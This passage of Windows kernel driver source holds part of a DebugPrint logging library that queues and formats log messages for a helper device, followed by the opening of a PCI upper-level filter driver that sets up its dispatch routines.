//////////////////////////////////////////////////////////////////////////////
//	DebugPrint globals

static BOOLEAN DebugPrintStarted = FALSE;
static char* DriverName = NULL;
static USHORT DriverNameLen = 0;

/////////////////////////////////////////////////////////////////////////////
//	DebugPrint Event structure (put in doubly-linked EventList)

typedef struct _DEBUGPRINT_EVENT
{
	LIST_ENTRY ListEntry;
	ULONG Len;
	UCHAR EventData[1];
} DEBUGPRINT_EVENT, *PDEBUGPRINT_EVENT;

//////////////////////////////////////////////////////////////////////////////
//	Globals to communicate with our system thread

PVOID ThreadObjectPointer=NULL;	// Thread pointer
BOOLEAN ExitNow;				// Set to cause thread to exit
KEVENT ThreadEvent;				// Set to make thread look at ExitNow.
LIST_ENTRY EventList;			// Doubly-linked list of written Events
KSPIN_LOCK EventListLock;		// Spin lock to guard access to EventList
KEVENT ThreadExiting;			// Set when thread exiting

void DebugPrintSystemThread( IN PVOID Context);
NTSTATUS OpenDebugPrintDriver( HANDLE* pDebugPrintDeviceHandle);

//////////////////////////////////////////////////////////////////////////////
//	DebugPrint local functions

HANDLE OpenDebugPrint();
void CloseDebugPrint( HANDLE h);
void DebugSprintf( char* buffer, int max, const char* format, va_list marker);
USHORT ANSIstrlen( char* str);
void ClearEvents();

//////////////////////////////////////////////////////////////////////////////
//	DebugPrintInit:		Initialise DebugPrint
//						Connect to DebugPrint driver at \Device\PHDDebugPrint
//
//	IRQL PASSIVE_LEVEL

void DebugPrintInit(char* _DriverName)
{
	HANDLE threadHandle;
	NTSTATUS status;

	// Copy the driver's name out of INIT code segment
	DriverNameLen = 1 + ANSIstrlen(_DriverName);
	DriverName = (char*)ExAllocatePool(NonPagedPool,DriverNameLen);
	if( DriverName==NULL) return;
	RtlCopyMemory( DriverName, _DriverName, DriverNameLen);

	/////////////////////////////////////////////////////////////////////////
	// Prepare for thread start

	ExitNow = FALSE;
	KeInitializeEvent(&ThreadEvent, SynchronizationEvent, FALSE);
	KeInitializeEvent(&ThreadExiting, SynchronizationEvent, FALSE);
	// Initialise event list
	KeInitializeSpinLock(&EventListLock);
	InitializeListHead(&EventList);

	/////////////////////////////////////////////////////////////////////////
	// Start system thread to write events to DebugPrint driver

	status = PsCreateSystemThread( &threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL,
									DebugPrintSystemThread, NULL);
	if( !NT_SUCCESS(status))
		return;

	/////////////////////////////////////////////////////////////////////////
	// Save a pointer to thread and close handle.

	status = ObReferenceObjectByHandle( threadHandle, THREAD_ALL_ACCESS, NULL, KernelMode,
										&ThreadObjectPointer, NULL);

	if( NT_SUCCESS(status))
		ZwClose(threadHandle);
	else
	{
		// Uh oh... force thread to exit
		ExitNow = TRUE;
		KeSetEvent( &ThreadEvent, 0, FALSE);
		return;
	}

	DebugPrintStarted = TRUE;

	// Send event that we've started logging
	DebugPrintMsg("DebugPrint logging started");
}

//////////////////////////////////////////////////////////////////////////////
//	DebugPrintClose:	Close connection to DebugPrint
//
//	IRQL PASSIVE_LEVEL

void DebugPrintClose()
{
	if( !DebugPrintStarted) return;

	DebugPrintMsg("DebugPrint logging ended");
	DebugPrintStarted = FALSE;
	
	// Tell thread to stop, and wait for it to stop
	ExitNow = TRUE;
	KeSetEvent( &ThreadEvent, 0, FALSE);
	KeWaitForSingleObject( &ThreadExiting, Executive, KernelMode, FALSE, NULL);

	// Dereference thread object
	if( ThreadObjectPointer!=NULL)
	{
		ObDereferenceObject(&ThreadObjectPointer);
		ThreadObjectPointer = NULL;
	}
	
	// Release our copy of DriverName
	if( DriverName!=NULL)
		ExFreePool(DriverName);
//	ClearEvents();
}

//////////////////////////////////////////////////////////////////////////////
//	DebugPrintMsg:	Send message event to DebugPrint
//
//	IRQL <= DISPATCH_LEVEL

void DebugPrintMsg(char* Msg)
{
	LARGE_INTEGER Now;
	TIME_FIELDS NowTF;
	USHORT MsgLen;
	ULONG EventDataLen, len;
	PDEBUGPRINT_EVENT pEvent;

	if( !DebugPrintStarted || DriverName==NULL) return;

	// Get current time
	KeQuerySystemTime(&Now);
//	LARGE_INTEGER NowLocal;
//	ExSystemTimeToLocalTime( &Now, &NowLocal);	// NT only
//	RtlTimeToTimeFields( &NowLocal, &NowTF);
	RtlTimeToTimeFields( &Now, &NowTF);

	// Get size of Msg and complete event
	MsgLen = ANSIstrlen(Msg)+1;
	EventDataLen = sizeof(TIME_FIELDS) + DriverNameLen + MsgLen;
	len = sizeof(LIST_ENTRY)+sizeof(ULONG)+EventDataLen;

	// Allocate event buffer
	pEvent = (PDEBUGPRINT_EVENT)ExAllocatePool(NonPagedPool,len);
	if( pEvent!=NULL)
	{
		PUCHAR buffer = (PUCHAR)pEvent->EventData;
		// Copy event info to buffer
		RtlCopyMemory( buffer, &NowTF, sizeof(TIME_FIELDS));
		buffer += sizeof(TIME_FIELDS);
		RtlCopyMemory( buffer, DriverName, DriverNameLen);
		buffer += DriverNameLen;
		RtlCopyMemory( buffer, Msg, MsgLen);

		// Insert event into event list for processing by system thread
		pEvent->Len = EventDataLen;
		ExInterlockedInsertTailList(&EventList,&pEvent->ListEntry,&EventListLock);
	}
}

//////////////////////////////////////////////////////////////////////////////
//*	DebugPrintVA:	Implement DebugPrint calls

void DebugPrintVA(int max, const char* format, va_list marker)
{
	char* Msg;
	if( !DebugPrintStarted) return;
	Msg = (char*)ExAllocatePool(NonPagedPool,max);
	if( Msg==NULL)
	{
		DebugPrintMsg("DebugPrint: Could not allocate buffer");
		return;
	}
	DebugSprintf(Msg,max,format,marker);
	DebugPrintMsg(Msg);
	ExFreePool(Msg);
}
#endif // DODEBUGPRINT

//////////////////////////////////////////////////////////////////////////////
//	DebugPrint:	Formatted print to DebugPrint, allocating own print buffer
//
//	IRQL <= DISPATCH_LEVEL

void DebugPrint(const char* format, ... )
{
#if DODEBUGPRINT
	va_list marker;
	if( !DebugPrintStarted) return;
	va_start(marker,format);
	DebugPrintVA(100,format,marker);
#endif // DODEBUGPRINT
}

//////////////////////////////////////////////////////////////////////////////
//	DebugPrint:	Formatted print to DebugPrint, giving size of buffer to allocate
//
//	IRQL <= DISPATCH_LEVEL

void DebugPrint2(int max, const char* format, ... )
{
#if DODEBUGPRINT
	va_list marker;
	if( !DebugPrintStarted) return;
	va_start(marker,format);
	DebugPrintVA(max,format,marker);
#endif // DODEBUGPRINT
}

#if DODEBUGPRINT
//////////////////////////////////////////////////////////////////////////////
//	IRP Major and Minor function names

static char* IrpMajorFunctionNames[] =
{
	"IRP_MJ_CREATE",
	"IRP_MJ_CREATE_NAMED_PIPE",
	"IRP_MJ_CLOSE",
	"IRP_MJ_READ",
	"IRP_MJ_WRITE",
	"IRP_MJ_QUERY_INFORMATION",
	"IRP_MJ_SET_INFORMATION",
	"IRP_MJ_QUERY_EA",
	"IRP_MJ_SET_EA",
	"IRP_MJ_FLUSH_BUFFERS",
	"IRP_MJ_QUERY_VOLUME_INFORMATION",
	"IRP_MJ_SET_VOLUME_INFORMATION",
	"IRP_MJ_DIRECTORY_CONTROL",
	"IRP_MJ_FILE_SYSTEM_CONTROL",
	"IRP_MJ_DEVICE_CONTROL",
	"IRP_MJ_INTERNAL_DEVICE_CONTROL",
	"IRP_MJ_SHUTDOWN",
	"IRP_MJ_LOCK_CONTROL",
	"IRP_MJ_CLEANUP",
	"IRP_MJ_CREATE_MAILSLOT",
	"IRP_MJ_QUERY_SECURITY",
	"IRP_MJ_SET_SECURITY",
	"IRP_MJ_POWER",
	"IRP_MJ_SYSTEM_CONTROL",
	"IRP_MJ_DEVICE_CHANGE",
	"IRP_MJ_QUERY_QUOTA",
	"IRP_MJ_SET_QUOTA",
	"IRP_MJ_PNP",
};
static ULONG NUM_IrpMajorFunctionNames = sizeof(IrpMajorFunctionNames)/sizeof(char*);

static char* PnPIrpMinorFunctionNames[] =
{
	"IRP_MN_START_DEVICE",
	"IRP_MN_QUERY_REMOVE_DEVICE",
	"IRP_MN_REMOVE_DEVICE",
	"IRP_MN_CANCEL_REMOVE_DEVICE",
	"IRP_MN_STOP_DEVICE",
	"IRP_MN_QUERY_STOP_DEVICE",
	"IRP_MN_CANCEL_STOP_DEVICE",
	"IRP_MN_QUERY_DEVICE_RELATIONS",
	"IRP_MN_QUERY_INTERFACE",
	"IRP_MN_QUERY_CAPABILITIES",
	"IRP_MN_QUERY_RESOURCES",
	"IRP_MN_QUERY_RESOURCE_REQUIREMENTS",
	"IRP_MN_QUERY_DEVICE_TEXT",
	"IRP_MN_FILTER_RESOURCE_REQUIREMENTS",
	"Nowt",
	"IRP_MN_READ_CONFIG",
	"IRP_MN_WRITE_CONFIG",
	"IRP_MN_EJECT",
	"IRP_MN_SET_LOCK",
	"IRP_MN_QUERY_ID",
	"IRP_MN_QUERY_PNP_DEVICE_STATE",
	"IRP_MN_QUERY_BUS_INFORMATION",
	"IRP_MN_DEVICE_USAGE_NOTIFICATION",
	"IRP_MN_SURPRISE_REMOVAL",
	"IRP_MN_QUERY_LEGACY_BUS_INFORMATION",
};
static ULONG NUM_PnPIrpMinorFunctionNames = sizeof(PnPIrpMinorFunctionNames)/sizeof(char*);

static char* PowerIrpMinorFunctionNames[] =
{
	"IRP_MN_WAIT_WAKE",
	"IRP_MN_POWER_SEQUENCE",
	"IRP_MN_SET_POWER",
	"IRP_MN_QUERY_POWER",
};
static ULONG NUM_PowerIrpMinorFunctionNames = sizeof(PowerIrpMinorFunctionNames)/sizeof(char*);

static char* WMIIrpMinorFunctionNames[] =
{
	"IRP_MN_QUERY_ALL_DATA",
	"IRP_MN_QUERY_SINGLE_INSTANCE",
	"IRP_MN_CHANGE_SINGLE_INSTANCE",
	"IRP_MN_CHANGE_SINGLE_ITEM",
	"IRP_MN_ENABLE_EVENTS",
	"IRP_MN_DISABLE_EVENTS",
	"IRP_MN_ENABLE_COLLECTION",
	"IRP_MN_DISABLE_COLLECTION",
	"IRP_MN_REGINFO",
	"IRP_MN_EXECUTE_METHOD",
};
static ULONG NUM_WMIIrpMinorFunctionNames = sizeof(WMIIrpMinorFunctionNames)/sizeof(char*);

static char* PowerSystemStates[] =
{
    "PowerSystemUnspecified",
    "PowerSystemWorking",
    "PowerSystemSleeping1",
    "PowerSystemSleeping2",
    "PowerSystemSleeping3",
    "PowerSystemHibernate",
    "PowerSystemShutdown",
};
static int NUM_PowerSystemStates = sizeof(PowerSystemStates)/sizeof(char*);

static char* PowerDeviceStates[] =
{
    "PowerDeviceUnspecified",
    "PowerDeviceD0",
    "PowerDeviceD1",
    "PowerDeviceD2",
    "PowerDeviceD3",
};
static int NUM_PowerDeviceStates = sizeof(PowerDeviceStates)/sizeof(char*);

/////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//*	All these PrintXxx routines return TRUE if the buffer is filled
//*	Safe way to put a character in a buffer

#define PHDput(ch) if( (*pbufpos)>=max) return TRUE; else buffer[(*pbufpos)++] = (ch)

/////////////////////////////////////////////////////////////////////////////
//	Digits for decimal and hex conversions

static char hexdigits[] = "0123456789ABCDEF";

/////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintChar( char* buffer, int max, int* pbufpos, char ch)
{
	PHDput(ch);
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintULONG( char* buffer, int max, int* pbufpos, ULONG v)
{
	int digits;
	ULONG v2;
	int digno;

	if( v==0)
	{
		PHDput('0');
		return FALSE;
	}
	// Get number of digits
	digits = 0;
	v2 = v;
	while(v2!=0)
	{
		v2 /= 10;
		digits++;
	}
	// Write out
	(*pbufpos) += digits;
	for( digno=1;digno<=digits;digno++)
	{
		char ch = hexdigits[v%10];
		if( (*pbufpos)-digno<max) buffer[(*pbufpos)-digno] = ch;
		v /= 10;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintInt( char* buffer, int max, int* pbufpos, int v)
{
	if( v<0)
	{
		PHDput('-');
		v = -v;
	}
	return PrintULONG( buffer, max, pbufpos, v);
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintULONG64( char* buffer, int max, int* pbufpos, unsigned __int64 v)
{
	int digits;
	unsigned __int64 v2;
	int digno;

	if( v==0)
	{
		PHDput('0');
		return FALSE;
	}
	// Get number of digits
	digits = 0;
	v2 = v;
	while(v2!=0)
	{
		v2 /= 10;
		digits++;
	}
	// Write out
	(*pbufpos) += digits;
	for( digno=1;digno<=digits;digno++)
	{
		char ch = hexdigits[v%10];
		if( (*pbufpos)-digno<max) buffer[(*pbufpos)-digno] = ch;
		v /= 10;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintInt64( char* buffer, int max, int* pbufpos, __int64 v)
{
	if( v<0)
	{
		PHDput('-');
		v = -v;
	}
	return PrintULONG64( buffer, max, pbufpos, v);
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintULONGhex( char* buffer, int max, int* pbufpos, ULONG v, int FormatSize)
{
	ULONG mask = 0xF0000000;
	int shift = 28;
	int digno;
	if( FormatSize>0 && FormatSize<8)
	{
		mask >>= 4*(8-FormatSize);
		shift -= 4*(8-FormatSize);
	}
	else
		FormatSize = 8;
	for( digno=0;digno<FormatSize;digno++)
	{
		int digit = (v&mask)>>shift;
		PHDput(hexdigits[digit]);
		mask >>= 4;
		shift -= 4;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintANSIString( char* buffer, int max, int* pbufpos, char* s, int FormatSize)
{
	char ch;
	BOOLEAN sized = (FormatSize>0);
	while( ch=*s++)
	{
		PHDput(ch);
		if( sized && (--FormatSize==0))
			break;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintWideString( char* buffer, int max, int* pbufpos, wchar_t* ws, int FormatSize)
{
	wchar_t ch;
	BOOLEAN sized = (FormatSize>0);
	while( ch=*ws++)
	{
		PHDput((char)ch);
		if( sized && (--FormatSize==0))
			break;
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintUnicodeString( char* buffer, int max, int* pbufpos, PUNICODE_STRING pus)
{
	int uslen = (pus->Length) >> 1;
	wchar_t* ws = pus->Buffer;
	int chno;
	for( chno=0;chno<uslen;chno++)
	{
		wchar_t ch = *ws++;
		if( ch==L'\0') break;
		PHDput((char)ch);
	}

	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////

BOOLEAN PrintIrp( char* buffer, int max, int* pbufpos, PIRP Irp)
{
	PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
	ULONG MajorFunction = IrpStack->MajorFunction;
	ULONG MinorFunction = IrpStack->MinorFunction;
	if( MajorFunction<NUM_IrpMajorFunctionNames)
	{
		char* MajorFunctionName = IrpMajorFunctionNames[MajorFunction];
		char* MinorFunctionName = NULL;
		char* ExtraDetails1 = NULL;
		char* ExtraDetails2 = NULL;

		if( PrintANSIString(buffer,max,pbufpos,MajorFunctionName,0)) return TRUE;

		switch(MajorFunction)
		{
		case Dbp_IRP_MJ_PNP:
			if( MinorFunction<NUM_PnPIrpMinorFunctionNames)
				MinorFunctionName = PnPIrpMinorFunctionNames[MinorFunction];
			else
			{
				PHDput(':');
				if( PrintULONGhex(buffer,max,pbufpos,MinorFunction,8)) return TRUE;
			}
			if( MinorFunction==Dbp_IRP_MN_QUERY_DEVICE_RELATIONS)
			{
				Dbp_PQueryDeviceRelations pQueryDeviceRelations= (Dbp_PQueryDeviceRelations)&IrpStack->Parameters.Read.Length;
				switch( pQueryDeviceRelations->Type)
				{
				case Dbp_BusRelations:			ExtraDetails1 = "BusRelations"; break;
				case Dbp_EjectionRelations:		ExtraDetails1 = "EjectionRelations"; break;
				case Dbp_PowerRelations:		ExtraDetails1 = "PowerRelations"; break;
				case Dbp_RemovalRelations:		ExtraDetails1 = "RemovalRelations"; break;
				case Dbp_TargetDeviceRelation:	ExtraDetails1 = "TargetDeviceRelation"; break;
				}
			}
			break;
		case Dbp_IRP_MJ_POWER:
			if( MinorFunction<NUM_PowerIrpMinorFunctionNames)
				MinorFunctionName = PowerIrpMinorFunctionNames[MinorFunction];
			if( MinorFunction==Dbp_IRP_MN_SET_POWER || MinorFunction==Dbp_IRP_MN_QUERY_POWER)
			{
				Dbp_PPower pPower = (Dbp_PPower)&IrpStack->Parameters.Read.Length;
				Dbp_POWER_STATE PowerState = pPower->State;
				ExtraDetails1 = (MinorFunction==Dbp_IRP_MN_SET_POWER ? "Set Power" : "Query Power");
				if( pPower->Type==Dbp_SystemPowerState)
				{
					if( PowerState.SystemState<NUM_PowerSystemStates)
						ExtraDetails2 = PowerSystemStates[PowerState.SystemState];
				}
				else
				{
					if( PowerState.DeviceState<NUM_PowerDeviceStates)
						ExtraDetails2 = PowerDeviceStates[PowerState.DeviceState];
				}
			}
			break;
		case Dbp_IRP_MJ_SYSTEM_CONTROL:
			if( MinorFunction<NUM_WMIIrpMinorFunctionNames)
				MinorFunctionName = WMIIrpMinorFunctionNames[MinorFunction];
			break;
		}
		if( MinorFunctionName!=NULL)
		{
			PHDput(':');
			if( PrintANSIString(buffer,max,pbufpos,MinorFunctionName,0)) return TRUE;
		}
		if( ExtraDetails1!=NULL)
		{
			PHDput(' ');
			if( PrintANSIString(buffer,max,pbufpos,ExtraDetails1,0)) return TRUE;
		}
		if( ExtraDetails2!=NULL)
		{
			PHDput(' ');
			if( PrintANSIString(buffer,max,pbufpos,ExtraDetails2,0)) return TRUE;
		}
	}
	return FALSE;
}

/////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//*	PHDsprintf:	Write formatted data to a string
//				PrintXxx routines used to do prints for each type
//				Give up as soon as end of buffer reached

#define PHD_va_arg(ap,t,v)	t v = va_arg(ap,t)

void DebugSprintf( char* buffer, int max, const char* format, va_list marker)
{
	int bufpos = 0;
	char ch;
	// Go through each format character
	while(ch=*format++)
	{
		int FormatSize = 0;
		if( ch!='%')
		{
			if( PrintChar(buffer,max,&bufpos,ch)) goto done;
			continue;
		}
		if( (ch=*format++) == '\0')
			break;
		if( ch=='*')
		{
			PHD_va_arg(marker,int,size);
			if( size>0)
				FormatSize = size;
			if( (ch=*format++) == '\0')
				break;
		}
		else if( ch>='1' && ch<='9')
		{
			FormatSize = 0;
			do
			{
				FormatSize = (FormatSize*10) + ch-'0';
				if( (ch=*format++) == '\0')
					break;
			}
			while( ch>='1' && ch<='9');
		}
		// Switch on specification character
		switch( ch)
		{
		//	ANSI char
		case 'c':
		{
			PHD_va_arg(marker,char,ch);
			if( PrintChar(buffer,max,&bufpos,ch)) goto done;
			break;
		}
		//	Wide char
		case 'C':
		{
			PHD_va_arg(marker,wchar_t,ch);
			if( PrintChar(buffer,max,&bufpos,(char)ch)) goto done;
			break;
		}
		//	Integer
		case 'd':
		case 'i':
		{
			PHD_va_arg(marker,int,i);
			if( PrintInt(buffer,max,&bufpos,i)) goto done;
			break;
		}
		//	__int64 in hex
		case 'D':
		{
			PHD_va_arg(marker,__int64,i64);
			if( PrintInt64(buffer,max,&bufpos,i64)) goto done;
			break;
		}
		//	__int64 in hex
		case 'l':
		{
			PHD_va_arg(marker,__int64,i64);
			LARGE_INTEGER li;
			li.QuadPart = i64;
			if( FormatSize==0) FormatSize=16;
			if( FormatSize>8)
			{
				if( PrintULONGhex(buffer,max,&bufpos,li.HighPart,FormatSize-8)) goto done;
			}
			if( PrintULONGhex(buffer,max,&bufpos,li.LowPart,FormatSize)) goto done;
			break;
		}
		//	LARGE_INTEGER in hex
		case 'L':
		{
			PHD_va_arg(marker,LARGE_INTEGER,li);
			if( FormatSize==0) FormatSize=16;
			if( FormatSize>8)
			{
				if( PrintULONGhex(buffer,max,&bufpos,li.HighPart,FormatSize-8)) goto done;
			}
			if( PrintULONGhex(buffer,max,&bufpos,li.LowPart,FormatSize)) goto done;
			break;
		}
		//	ULONG
		case 'u':
		{
			PHD_va_arg(marker,ULONG,uv);
			if( PrintULONG(buffer,max,&bufpos,uv)) goto done;
			break;
		}
		// ULONG as hex
		case 'x':
		{
			PHD_va_arg(marker,ULONG,uv);
			if( PrintULONGhex(buffer,max,&bufpos,uv,FormatSize)) goto done;
			break;
		}
		//	ANSI string
		case 's':
		{
			PHD_va_arg(marker,char*,s);
			if( PrintANSIString(buffer,max,&bufpos,s,FormatSize)) goto done;
			break;
		}
		//	Wide string
		case 'S':
		{
			PHD_va_arg(marker,wchar_t*,ws);
			if( PrintWideString(buffer,max,&bufpos,ws,FormatSize)) goto done;
			break;
		}
		//	PUNICODE_STRING
		case 'T':
		{
			PHD_va_arg(marker,PUNICODE_STRING,pus);
			if( PrintUnicodeString(buffer,max,&bufpos,pus)) goto done;
			break;
		}
		//	PIRP
		case 'I':
		{
			PHD_va_arg(marker,PIRP,Irp);
			if( PrintIrp(buffer,max,&bufpos,Irp)) goto done;
			break;
		}
		default:
			if( PrintChar(buffer,max,&bufpos,ch)) goto done;
		}
	}

	// NULL terminate string
	PrintChar(buffer,max,&bufpos,'\0');
done:
	// Ensure string terminated
	buffer[max-1] = '\0';
}

//////////////////////////////////////////////////////////////////////////////
//*	ANSIstrlen:	Return length of null terminated ANSI string

USHORT ANSIstrlen( char* str)
{
	USHORT len = 0;
	for(;*str++!='\0';)
		len++;
	return len;
}

/////////////////////////////////////////////////////////////////////////////
//*	DebugPrintSystemThread:
//
// Description:
//		System thread to print device events.
//		Check for events every second, and wait for ThreadEvent ExitNow
//
// IRQL:
//		<= APC_LEVEL_IRQL
//
// Arguments:
//		Context has no meaning
//
// Return Value:
//		(None)

void DebugPrintSystemThread( IN PVOID Context)
{
	HANDLE DebugPrintDeviceHandle = NULL;
	NTSTATUS status;
	LARGE_INTEGER OneSecondTimeout;
	LARGE_INTEGER ByteOffset;

	/////////////////////////////////////////////////////////////////////////
	// Lower thread priority

	KeSetPriorityThread( KeGetCurrentThread(), LOW_REALTIME_PRIORITY);

	/////////////////////////////////////////////////////////////////////////
	// Attempt to open DebugPrt driver for 5 mins

	status = OpenDebugPrintDriver( &DebugPrintDeviceHandle);
	if( !NT_SUCCESS(status) || DebugPrintDeviceHandle==NULL)
		goto exit1;
	
	/////////////////////////////////////////////////////////////////////////
	// Set up timeout and byte offset values
	
	OneSecondTimeout.QuadPart = -1i64 * 1000000i64 * 10i64;
	ByteOffset.QuadPart = 0i64;

	/////////////////////////////////////////////////////////////////////////
	// Loop waiting for events or ExitNow to go TRUE

	while(TRUE)
	{
		/////////////////////////////////////////////////////////////////////
		// Wait for a request from DebugPrintMsg or DebugPrintClose

		KeWaitForSingleObject( &ThreadEvent, Executive, KernelMode, FALSE, &OneSecondTimeout);

		/////////////////////////////////////////////////////////////////////
		//	Remove any Events from EventList and send to DebugPrint driver

		while(TRUE)
		{
			IO_STATUS_BLOCK IoStatus;
			PDEBUGPRINT_EVENT pEvent;
			ULONG EventDataLen;

			PLIST_ENTRY pListEntry = ExInterlockedRemoveHeadList( &EventList, &EventListLock);
			if( pListEntry==NULL)
				break;

			// Get event as DEBUGPRINT_EVENT
			pEvent = CONTAINING_RECORD( pListEntry, DEBUGPRINT_EVENT, ListEntry);

			// Get length of event data
			EventDataLen = pEvent->Len;

			// Send event to DebugPrint
			status = ZwWriteFile(	DebugPrintDeviceHandle, NULL, NULL, NULL,
									&IoStatus, pEvent->EventData, EventDataLen, &ByteOffset, NULL);
//			if( status!=STATUS_SUCCESS)
//				return;
//			if( IoStatus.Information != len)
//				return;

			// Free our event buffer
			ExFreePool(pEvent);
		}

		/////////////////////////////////////////////////////////////////////
		// DebugPrintClose called, so stop the thread now.

		if( ExitNow)
			break;
	}

	/////////////////////////////////////////////////////////////////////////
	// Tidy up and terminate thread
	ZwClose(DebugPrintDeviceHandle);
exit1:
	DebugPrintStarted = FALSE;
	ClearEvents();
	KeSetEvent( &ThreadExiting, 0, FALSE);
	PsTerminateSystemThread(STATUS_SUCCESS);
}

//////////////////////////////////////////////////////////////////////////////
//*	OpenDebugPrintDriver:	Attempt to open DebugPrt driver for 5 mins
//							Try opening every 20 seconds.
//							This gives DebugPrt time to start at boot time

NTSTATUS OpenDebugPrintDriver( HANDLE* pDebugPrintDeviceHandle)
{
	NTSTATUS status;
	UNICODE_STRING DebugPrintName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK IoStatus;
	LARGE_INTEGER OneSecondTimeout;
	int DelaySeconds = 0;

	// Set up timeout
	OneSecondTimeout.QuadPart = -1i64 * 1000000i64 * 10i64;

	// Make DebugPrint device name as UNICODE_STRING
	RtlInitUnicodeString( &DebugPrintName, L"\\Device\\PHDDebugPrint");

	// Make appropriate ObjectAttributes for ZwCreateFile
	InitializeObjectAttributes( &ObjectAttributes, &DebugPrintName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//////////////////////////////////////////////////////////////////////////
	// Attempt to open DebugPrt handle for 5 minutes

	while( DelaySeconds<5*60)
	{
		int Delay;

		//////////////////////////////////////////////////////////////////////
		// Open handle to DebugPrint device

		status = ZwCreateFile( pDebugPrintDeviceHandle,
			GENERIC_READ | GENERIC_WRITE,
			&ObjectAttributes,
			&IoStatus,
			0, // alloc size = none
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ|FILE_SHARE_WRITE,
			FILE_OPEN,
			0,
			NULL,  // eabuffer
			0 );   // ealength

		if( NT_SUCCESS(status) && *pDebugPrintDeviceHandle!=NULL)
			return status;

		//////////////////////////////////////////////////////////////////////
		// Wait for 20 seconds.

		for( Delay=20; Delay>0; Delay--)
		{
			KeWaitForSingleObject( &ThreadEvent, Executive, KernelMode, FALSE, &OneSecondTimeout);
			if( ExitNow)
				return status;
			DelaySeconds++;
		}
	}
	return status;
}

//////////////////////////////////////////////////////////////////////////////
//*	ClearEvents:	Clear any remaining events

void ClearEvents()
{
	while(TRUE)
	{
		PDEBUGPRINT_EVENT pEvent;
		PLIST_ENTRY pListEntry = ExInterlockedRemoveHeadList( &EventList, &EventListLock);
		if( pListEntry==NULL)
			break;
		pEvent = CONTAINING_RECORD( pListEntry, DEBUGPRINT_EVENT, ListEntry);
		ExFreePool(pEvent);
	}
}
//////////////////////////////////////////////////////////////////////////////

#endif  // DODEBUGPRINT

```

`source/WormholeDrivers/PHYMEM/PCIFlt/DebugPrint.h`:

```h
//////////////////////////////////////////////////////////////////////////////
//	Copyright © 1998,1999 PHD Computer Consultants Ltd
//	DebugPrint code header to add to a test driver
//
/////////////////////////////////////////////////////////////////////////////

#ifdef __cplusplus
extern "C"
{
#endif

#define DEBUGPRINT 0	// Set to 1 to do DebugPrints in free version

/////////////////////////////////////////////////////////////////////////////

#if DBG || DEBUGPRINT
#define DODEBUGPRINT 1
#else
#define DODEBUGPRINT 0
#endif

#if DODEBUGPRINT

void DebugPrintInit(char*);
void DebugPrintClose();
void DebugPrintMsg(char*);

#else

#define DebugPrintInit(x)
#define DebugPrintClose()
#define DebugPrintMsg(x)

#endif

void DebugPrint2(int max, const char *format, ... );
void DebugPrint(const char *format, ... );

/////////////////////////////////////////////////////////////////////////////

#ifdef __cplusplus
}
#endif

/////////////////////////////////////////////////////////////////////////////

```

`source/WormholeDrivers/PHYMEM/PCIFlt/PCIFilter.c`:

```c
/*++
PCI upper level filter
Version: 1.0
Author: akui
Date: 2009/3/8
--*/

#include <wdm.h>
#include "PCIFilter.h"
#include "DebugPrint.h"

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dro, IN PUNICODE_STRING RegistryPath);

NTSTATUS PCIFltAddDevice(IN PDRIVER_OBJECT dro, IN PDEVICE_OBJECT pdo);
NTSTATUS PCIFltPnp(IN PDEVICE_OBJECT fido, IN PIRP irp);
NTSTATUS PCIFltPower(IN PDEVICE_OBJECT fido, IN PIRP irp);
VOID PCIFltUnload(IN PDRIVER_OBJECT dro);

NTSTATUS PCIFltCreate(IN PDEVICE_OBJECT fido, IN PIRP irp);
NTSTATUS PCIFltClose(IN PDEVICE_OBJECT fido, IN PIRP irp);
NTSTATUS PCIFltDevCtl(IN PDEVICE_OBJECT fido, IN PIRP irp);

NTSTATUS PassIRP(IN PDEVICE_OBJECT fido, IN PIRP irp);
NTSTATUS StartCompletion(IN PDEVICE_OBJECT fido, IN PIRP irp, IN PVOID Context);
NTSTATUS DevUsgNotifyCompletion(IN PDEVICE_OBJECT fido, IN PIRP irp, IN PVOID Context);

#pragma alloc_text(INIT, DriverEntry)

//driver entry
NTSTATUS DriverEntry(IN PDRIVER_OBJECT dro, IN PUNICODE_STRING RegistryPath)
{
	ULONG i;

	UNREFERENCED_PARAMETER (RegistryPath);

	DebugPrintInit("PCIFilter");

	//initialize all functions to PCIFltPass
	for (i=0; i<=IRP_MJ_MAXIMUM_FUNCTION; i++)
		dro->MajorFunction[i]=PassIRP;

	//we should handle PNP, POWER, AddDevice, Unload
	dro->MajorFunction[IRP_MJ_PNP]=PCIFltPnp;
	dro->MajorFunction[IRP_MJ_POWER]=PCIFltPower;
	dro->MajorFunction[IRP_MJ_DEVICE_CONTROL]=PCIFltDevCtl;
	dro->DriverExtension->AddDevice=PCIFltAddDevice;
	dro->DriverUnload=PCIFltUnload;

	//we should handle CREATE, CLOSE because pci bus
	//driver didn't implement these, without doing so
	//will prevent other driver to reference this device
	dro->MajorFunction[IRP_MJ_CREATE]=PCIFltCreate;
	dro->MajorFunction[IRP_MJ_CLOSE]=PCIFltClose;

	return STATUS_SUCCESS;
}

//add device
NTSTATUS PCIFltAddDevice(IN PDRIVER_OBJECT dro, IN PDEVICE_OBJECT pdo)
{
	NTSTATUS ntStatus=STATUS_SUCCESS;
	PDEVICE_OBJECT fido=NULL;
	PDEVICE_EXTENSION dx;
	UNICODE_STRING devNameU;

	PAGED_CODE();

	DebugPrintMsg("AddDevice started");

